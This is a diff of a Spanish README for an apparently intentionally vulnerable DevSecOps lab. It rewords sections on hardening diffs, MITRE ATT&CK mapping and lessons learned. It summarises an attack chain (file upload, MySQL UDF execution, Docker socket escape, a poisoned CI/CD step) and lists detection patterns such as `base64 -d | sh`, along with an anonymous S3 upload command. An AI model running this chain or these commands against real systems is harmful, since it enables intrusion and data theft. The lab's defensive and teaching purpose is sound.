 | Initial Access | Trusted Relationship / Valid Accounts | T1199/T1078 | `Principal` explícito, nunca `"*"` |
 | Exfiltration | Exfiltration to Cloud Storage | T1567.002 | S3 Block Public Access a nivel de cuenta |
 
-> ### 💡 Insight — Capa 5 (cierre de la cadena)
-> Ningún paso individual fue un 0-day. Cada uno aprovechó una decisión que, aislada, parecía razonable —una comodidad de desarrollo, un valor por defecto, una prisa— pero que resultó inapropiada en un entorno con **conectividad real entre capas**. El ataque empezó con una subida de fichero y terminó con control administrativo de la cuenta. Eso es exactamente lo que una auditoría seria busca encontrar: **antes de que lo encuentre un atacante.**
+> **Nota.** Ninguna de las técnicas de la cadena es un 0-day; todas explotan configuraciones documentadas. Cada paso aprovecha una decisión de configuración que resulta problemática al existir conectividad entre las capas. La cadena empieza con una subida de fichero y termina con acceso a la cuenta cloud.
 
 </details>
 
@@ -432,11 +408,11 @@ aws s3 cp ./payload.txt s3://devsecops-public-data-bucket/ --no-sign-request   #
 
 ## Remediación y hardening
 
-> No es un checklist de "cosas a cambiar". Para cada vulnerabilidad se documenta el **diff**, el **control** que restaura, y —lo que de verdad importa— el **control sistémico** que evita que ese *tipo* de error vuelva a aparecer. Parchear es tratar el síntoma; arreglar es tratar el proceso.
+Para cada vulnerabilidad se documenta el diff correspondiente, el control que restaura y el control sistémico que evita que ese tipo de error reaparezca en el siguiente ciclo de desarrollo. Corregir la línea afectada trata el síntoma; intervenir en el proceso que la generó trata la causa.
 
 <p align="center">
-  <img src="docs/animations/05-diff-toggle.gif" alt="Toggle entre versión vulnerable y hardened del mismo fichero" width="820">
-  <br><em>Vulnerable ⇄ hardened sobre el mismo fichero: lo que demuestra capacidad de <strong>remediar</strong>, no solo de atacar.</em>
+  <img src="docs/animations/05-diff-toggle.gif" alt="Comparación entre la versión vulnerable y la endurecida del mismo fichero" width="820">
+  <br><em>Comparación entre las versiones vulnerable y endurecida del mismo fichero.</em>
 </p>
 
 <!-- GUION · 05-diff-toggle.gif ---------------------------------------------
@@ -444,7 +420,7 @@ aws s3 cp ./payload.txt s3://devsecops-public-data-bucket/ --no-sign-request   #
      líneas rojas (-) desapareciendo y las verdes (+) entrando. ~8 s, loop.
 ------------------------------------------------------------------------------>
 
-### Resumen ejecutivo
+### Resumen
 
 | Capa | Vulnerabilidad | Fix | Pre | Post | Control sistémico |
 |---|---|---|:--:|:--:|---|
@@ -546,8 +522,8 @@ resource "aws_s3_bucket_server_side_encryption_configuration" "sse" {
 ```
 </details>
 
-**Control restaurado:** mínimo privilegio en las tres dimensiones de IAM (quién asume, qué delega, qué hace) + denegación por defecto en red + cierre de exposición de datos.
-**Control sistémico:** `tfsec`/`checkov` bloquean `Principal:*`, `PassRole Resource:*` y adjuntos de admin **antes** del `apply`; **S3 Block Public Access a nivel de cuenta** invalida cualquier policy pública en todos los buckets de una sola llamada —el control de mayor impacto/esfuerzo de esta capa—.
+**Control restaurado:** mínimo privilegio en las tres dimensiones de IAM (quién asume, qué delega, qué hace), denegación por defecto en red y cierre de la exposición de datos.
+**Control sistémico:** `tfsec`/`checkov` bloquean `Principal:*`, `PassRole Resource:*` y los adjuntos de admin antes del `apply`. El control con mejor relación impacto/esfuerzo de esta capa es S3 Block Public Access a nivel de cuenta, que invalida cualquier policy pública en todos los buckets con una sola configuración.
 
 </details>
 
@@ -559,7 +535,7 @@ resource "aws_s3_bucket_server_side_encryption_configuration" "sse" {
 -   ufw: { state: disabled }
 + - name: Habilitar UFW con política deny por defecto
 +   ufw: { state: enabled, policy: deny }
-+ - name: Permitir SSH solo desde red de administración
++ - name: Permitir SSH solo desde la red de administración
 +   ufw: { rule: allow, port: 22, proto: tcp, src: "{{ admin_network_cidr }}" }
 
 - - name: Socket de Docker 0777
@@ -572,8 +548,8 @@ resource "aws_s3_bucket_server_side_encryption_configuration" "sse" {
 +   lineinfile: { path: /etc/audit/rules.d/docker.rules, line: "-w /var/run/docker.sock -p rwxa -k docker_socket", create: yes }
 ```
 
-**Control restaurado:** aislamiento de proceso (socket solo para `root` + grupo `docker`) y firewall con denegación por defecto.
-**Control sistémico:** `ansible-lint` marca `mode: '0777'` y `ufw: disabled` como errores en el pipeline; `inspec`/`auditd` validan post-despliegue.
+**Control restaurado:** el socket queda restringido a `root` y al grupo `docker`, y el firewall vuelve a denegar por defecto.
+**Control sistémico:** `ansible-lint` marca `mode: '0777'` y `ufw: disabled` como error en el pipeline; `inspec`/`auditd` lo validan tras el despliegue.
 
 </details>
 
@@ -610,13 +586,13 @@ curl -sfL https://get.k3s.io | sh -s - --secrets-encryption --write-kubeconfig-m
 k3s secrets-encrypt status   # → Encryption: enabled (AES-CBC 256)
 ```
 
-**Control restaurado:** ningún pod accede al daemon, filesystem ni namespaces del host; los Secrets no son legibles desde disco sin la clave.
-**Control sistémico:** PSA `restricted` rechaza `privileged`/`hostPath`/`hostPID`/`hostNetwork` en el API server; OPA Gatekeeper/Kyverno para políticas de imagen; Kaniko/Buildah para builds sin `docker.sock`.
+**Control restaurado:** ningún pod accede al daemon, al filesystem ni a los namespaces del host, y los Secrets dejan de ser legibles desde disco sin la clave.
+**Control sistémico:** PSA `restricted` rechaza `privileged`/`hostPath`/`hostPID`/`hostNetwork` en el propio API server; OPA Gatekeeper/Kyverno para políticas de imagen; Kaniko/Buildah para builds sin `docker.sock`.
 
 </details>
 
 <details>
-<summary><strong>Diffs · CI/CD — y el estado del arte (OIDC)</strong></summary>
+<summary><strong>Diffs · CI/CD y credenciales federadas (OIDC)</strong></summary>
 
 ```diff
 # gitea-deployment.yaml
@@ -631,7 +607,7 @@ k3s secrets-encrypt status   # → Encryption: enabled (AES-CBC 256)
 +     --token $(cat /run/secrets/runner-token)
 ```
 
-**El problema de fondo no es que los secretos estén hardcodeados: es que existen como artefactos estáticos robables.** La solución 2024-2025 es eliminarlos con **OIDC federation**:
+Mover los secretos a un `Secret` de Kubernetes mejora la situación, pero no elimina el problema de fondo: siguen siendo artefactos estáticos susceptibles de robo. La alternativa es no tener secretos estáticos, mediante OIDC federation:
 
 ```yaml
 # workflow: credenciales temporales, sin claves estáticas
@@ -653,16 +629,16 @@ resource "aws_iam_role" "gitea_oidc_role" {
 }
 ```
 
-Con OIDC no hay credenciales en ningún ConfigMap, Secret, env ni fichero. El token es temporal (15 min por defecto), generado en runtime para *ese* repo y rama, e inutilizable fuera de contexto. **Un atacante que comprometa el runner obtiene credenciales que expiran en minutos, no claves que duran indefinidamente.**
+Con OIDC no queda ninguna credencial en ConfigMaps, Secrets, variables de entorno ni ficheros. El token es temporal (15 minutos por defecto), se genera en tiempo de ejecución para un repositorio y rama concretos y no es válido fuera de ese contexto. Un atacante que comprometa el runner obtiene credenciales que expiran en minutos, en lugar de claves de larga duración.
 
-**Control restaurado:** separación configuración/credenciales, con credenciales efímeras y scoped al contexto de ejecución.
-**Control sistémico:** Gitleaks en pre-commit y PR; `tfsec` sobre los roles OIDC; runners de un solo uso.
+**Control restaurado:** configuración y credenciales separadas, con credenciales efímeras y acotadas al contexto de ejecución.
+**Control sistémico:** Gitleaks en pre-commit y en PR; `tfsec` sobre los roles OIDC; runners de un solo uso.
 
 </details>
 
-### La arquitectura de control sistémico
+### Prevención, detección y respuesta
 
-Los diffs cierran los síntomas explotados. Pero el proceso que los generó —desarrollo sin revisión de seguridad, IaC sin pipeline de validación, runners configurados por comodidad— seguirá produciendo los mismos errores en el siguiente sprint si no se interviene. El cierre del ciclo tiene tres capas:
+Los diffs corrigen los síntomas concretos. El proceso que los generó (desarrollo sin revisión de seguridad, IaC sin pipeline de validación, runners configurados por comodidad) volverá a producir los mismos errores si no se interviene sobre él. La cobertura se organiza en tres frentes:
 
 ```
 ┌───────────────────────────────────────────────────────────────────┐
@@ -680,43 +656,42 @@ Los diffs cierran los síntomas explotados. Pero el proceso que los generó —d
 └───────────────────────────────────────────────────────────────────┘
 ```
 
-> ### 💡 Insight — la doble cara del IaC
-> La misma propiedad que hizo peligrosa la cadena —que los errores se despliegan de forma automatizada y reproducible en **todos** los entornos— es la que hace eficiente el hardening: un fix en `iam.tf` es un fix en todos los entornos a la vez, con trazabilidad completa en Git. **La reproducibilidad es el arma de ambos bandos.** Esa es la doble cara que conviene mostrar a quien evalúa este proyecto.
+La propiedad del IaC que amplifica el impacto de un error (se despliega de forma idéntica en todos los entornos) es la misma que abarata la corrección: un fix en `iam.tf` se aplica a todos los entornos a la vez, con trazabilidad en el historial de Git.
 
 ---
 
 ## MITRE ATT&CK — cobertura
 
-La cadena cubre **11 de las 14 tácticas** de la matriz Enterprise (quedan fuera Impact, Resource Development y Reconnaissance, por ser un entorno controlado sin targets externos). Lo relevante no es el número, sino que Lateral Movement real entre contenedores, Privilege Escalation vía IaC y CI/CD como vector de Persistence **aparecen como resultado de explotación real**, no como filas añadidas a un mapeo genérico.
+La cadena cubre 11 de las 14 tácticas de la matriz Enterprise. Quedan fuera Impact, Resource Development y Reconnaissance, por tratarse de un entorno controlado sin objetivos externos. La tabla recoge una técnica representativa por táctica, correspondiente a explotación efectiva en el laboratorio.
 
-| Táctica | Técnica firma del lab | ID | Detección característica |
+| Táctica | Técnica representativa | ID | Detección característica |
 |---|---|---|---|
 | Initial Access | Exploit Public-Facing Application | T1190 | WAF: `.php` en directorio de uploads |
 | Execution | UDF Abuse (`sys_eval`) | T1203 | MySQL log: `CREATE FUNCTION` + `INTO DUMPFILE` |
 | Persistence | Compromise Infrastructure: CI/CD | T1584 | Gitleaks: token en diff de manifiesto |
 | Privilege Escalation | Escape to Host | T1611 | Falco: contenedor con `privileged` + host mount |
-| Defense Evasion | Obfuscated Files or Information | T1027 | Static analysis: `base64 -d \| sh` en workflow |
+| Defense Evasion | Obfuscated Files or Information | T1027 | Análisis estático: `base64 -d \| sh` en workflow |
 | Credential Access | Unsecured Credentials: Kine DB | T1552.007 | auditd: acceso a `state.db` |
-| Discovery | Cloud Service Discovery | T1526 | CloudTrail: ráfaga de `list-*` sin UA legítimo |
-| Lateral Movement | Container API for Lateral Movement | T1610 | Falco: `connect` a `docker.sock` no-`dockerd` |
-| Collection | Data from Information Repositories | T1213 | FIM sobre `hostPath` de pods de infra |
-| Command & Control | Non-Standard Port | T1571 | Egress a puerto no-80/443 desde pod |
+| Discovery | Cloud Service Discovery | T1526 | CloudTrail: ráfaga de `list-*` sin user-agent legítimo |
+| Lateral Movement | Container API for Lateral Movement | T1610 | Falco: `connect` a `docker.sock` desde proceso no-`dockerd` |
+| Collection | Data from Information Repositories | T1213 | FIM sobre `hostPath` de pods de infraestructura |
+| Command & Control | Non-Standard Port | T1571 | Egress a puerto distinto de 80/443 desde un pod |
 | Exfiltration | Exfiltration to Cloud Storage | T1567.002 | S3 access logs: `PUT` anónimo externo |
 
-> 📎 El mapeo completo (técnica por técnica, con materialización, detección y mitigación MITRE por cada una) vive en [`docs/MITRE-MATRIX.md`](docs/MITRE-MATRIX.md) — es material de consulta, no de lectura.
+> El mapeo técnica por técnica, con materialización, detección y mitigación de cada una, está en [`docs/MITRE-MATRIX.md`](docs/MITRE-MATRIX.md). Es material de consulta.
 
-<!-- NOTA: mueve aquí la tabla exhaustiva de ~40 técnicas del README original,
-     a docs/MITRE-MATRIX.md. Este README solo enlaza al detalle. -->
+<!-- NOTA: la tabla exhaustiva de ~40 técnicas del README original va a docs/MITRE-MATRIX.md.
+     Este README solo enlaza al detalle. -->
 
 ---
 
-## Lecciones aprendidas
+## Notas técnicas
 
-**El error real nunca está donde lo esperas.** El primer instinto fue poner la vulnerabilidad crítica en la capa más visible: la app web. La cadena real demostró lo contrario —DVWA estaba razonablemente aislado; el fallo estaba tres capas más adentro, en un `docker.sock` montado "para facilitar el desarrollo"—. Ese desfase entre dónde se intuye el riesgo y dónde está es justo lo que una auditoría busca. Si el lab lo hubiera diseñado de forma obvia, habría enseñado menos.
+**El fallo de mayor impacto no está en la capa expuesta.** DVWA está razonablemente aislado; el fallo crítico está tres capas más adentro, en un `docker.sock` montado para facilitar el desarrollo. La ubicación esperada del riesgo (la aplicación web) y su ubicación real no coinciden, lo que es relevante a la hora de priorizar una auditoría.
 
-**La Docker Engine API sin CLI es protocolo, no herramientas.** Sin `docker`, sin `curl`, sin utilidades de red: hablar el REST a mano sobre el socket Unix con `socket` de Python. Las decisiones de payload que parecen menores —`alpine` en vez de `mysql:5.7`, `NetworkMode: host` para saltar el NAT, `Binds` en vez de `mount --bind`— cada una resolvió un fallo silencioso. Documentar los fallos intermedios valió tanto como el exploit final.
+**Interactuar con la Docker API sin CLI es un ejercicio de protocolo.** Sin `docker`, sin `curl` y sin utilidades de red, las peticiones REST se construyen a mano sobre el socket Unix con el módulo `socket` de Python. Varias decisiones (`alpine` en lugar de `mysql:5.7`, `NetworkMode: host` para evitar el NAT, `Binds` en lugar de `mount --bind`) resuelven fallos que no producen mensaje de error. Diagnosticar esos fallos silenciosos requirió más tiempo que el exploit final.
 
-**CI/CD es la capa que más infravaloran los threat models tradicionales.** El pipeline tenía acceso legítimo a todo. Comprometerlo no exigió ningún exploit sofisticado —una línea en un YAML, disfrazada de escaneo de seguridad—. Rara vez aparece en los modelos de amenaza porque "no es un servidor de producción". Es el vector más infravalorado y, con despliegue continuo, el más crítico.
+**El CI/CD suele quedar fuera del modelo de amenazas.** El pipeline tiene acceso legítimo a las credenciales de despliegue, y comprometerlo solo requiere una línea en un workflow YAML presentada como un paso de escaneo. En infraestructuras con despliegue continuo es uno de los vectores de mayor impacto, pese a no considerarse habitualmente un servidor de producción.
 
 ---
 
@@ -780,7 +755,7 @@ kubectl apply -f mysql-vulnerable.yaml -f dvwa-vulnerable.yaml
 #     http://192.168.252.10:30000  →  git push del devsecops-demo
 ```
 
-**Entorno listo cuando:** LocalStack healthy (S3/IAM/EC2/STS) · K3s en `Ready` · pods `Running` en `vulnerable-apps` y `gitea` · DVWA accesible en nivel "Low" · `docker.sock` en `0777` · UFW inactivo.
+**El entorno está listo cuando:** LocalStack healthy (S3/IAM/EC2/STS) · K3s en `Ready` · pods `Running` en `vulnerable-apps` y `gitea` · DVWA accesible en nivel "Low" · `docker.sock` en `0777` · UFW inactivo.
 
 ### Versión hardened (contraste)
 
@@ -795,13 +770,11 @@ cd 02-provisioning        && ansible-playbook -i inventory.ini site_hardened.yml
 
 ## Referencias
 
-Fuentes que resolvieron problemas concretos durante la construcción, no una lista genérica de "recursos de seguridad":
-
 - **MITRE ATT&CK Enterprise** — [attack.mitre.org](https://attack.mitre.org) — vocabulario del mapeo táctico.
 - **UDF Abuse (MySQL)** — módulo `lib_mysqludf_sys` de [Rapid7/Metasploit](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql).
-- **Docker socket escape** — análisis de Rory McCune / NCC Group sobre abuso del Unix socket sin CLI.
-- **Poisoned Pipeline Execution** — Aviv Grafi, Argon Security (2021), *"Attacking CI/CD without any Access to Source Code"*.
-- **OIDC Federation** — AWS *"Creating OIDC identity providers"* + Gitea Actions / `aws-actions/configure-aws-credentials`.
+- **Docker socket escape** — análisis de Rory McCune / NCC Group sobre abuso del socket Unix sin CLI.
+- **Poisoned Pipeline Execution** — Aviv Grafi, Argon Security (2021), *Attacking CI/CD without any Access to Source Code*.
+- **OIDC Federation** — AWS, *Creating OIDC identity providers* + Gitea Actions / `aws-actions/configure-aws-credentials`.
 - **K3s Secrets Encryption** — [docs.k3s.io/security/secrets-encryption](https://docs.k3s.io/security/secrets-encryption).
 - **tfsec / checkov** — [aquasecurity.github.io/tfsec](https://aquasecurity.github.io/tfsec) · [checkov.io](https://checkov.io).
 
@@ -809,4 +782,4 @@ Fuentes que resolvieron problemas concretos durante la construcción, no una lis
 
 ## Licencia
 
-MIT — exclusivamente para fines educativos y de demostración en entornos controlados y aislados. Usar estas técnicas contra sistemas sin autorización explícita del propietario es ilegal; el autor no asume responsabilidad por uso fuera del contexto para el que fue diseñado.
+MIT — exclusivamente para fines educativos y de demostración en entornos controlados y aislados. Usar estas técnicas contra sistemas sin autorización explícita del propietario es ilegal; el autor no asume responsabilidad por el uso fuera del contexto para el que fue diseñado.
